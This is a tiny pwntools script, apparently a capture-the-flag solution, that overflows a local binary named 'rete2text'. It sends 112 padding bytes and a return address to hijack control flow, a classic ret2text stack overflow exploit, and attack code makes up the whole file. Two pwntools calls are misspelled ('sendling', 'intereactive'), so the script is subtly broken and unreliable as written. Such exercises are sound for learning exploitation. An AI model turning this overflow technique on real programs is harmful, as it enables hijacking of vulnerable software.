from pwn import *
sh = process("./rete2text")
target = 0x804863a
payload = b'A'*112 + p32(target)
sh.sendling(payload)
sh.intereactive()